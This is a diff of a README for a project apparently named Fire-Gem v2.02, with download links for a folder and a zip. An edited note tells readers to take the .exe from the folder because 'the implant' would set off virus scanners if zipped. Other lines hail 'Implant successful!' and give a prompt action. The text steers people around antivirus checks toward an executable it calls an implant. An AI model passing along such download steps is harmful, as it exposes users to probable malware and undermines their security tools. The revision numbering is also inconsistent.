@@ -18,13 +18,13 @@
 
 ###### Uplink : <a href="https://github.com/mercwar/Fire-Gem/tree/main/Fire-Gem-v2.02">Folder</a>  
 ###### Downlink : <a href="https://github.com/mercwar/Fire-Gem/raw/main/Fire-Gem-v2.02.zip">Zip</a> 
-###### *note: there is now no .exe file in the Fire-Gem-v2.02 zip, you have to download it from the folder, because the implant will trigger a virus scanner in the zip.*
+###### *Note: There is now no .exe file in the Fire-Gem-v2.02 zip, you have to download it from the folder, because the implant, if in a zip, wont go through a scanners.*
 
 
 
 <a href="https://mercwar.github.io/Fire-Gem-v2.02.zip"><img src="images/fgi.png"/></a>
 
-#### Revision v2.03  
+#### Revision v2.02  
 - 🚀 **Implant successful!**  
 - 🧩 Prompt FireGem with **[ACTION: RunModuleCheck]**  
   Example:  
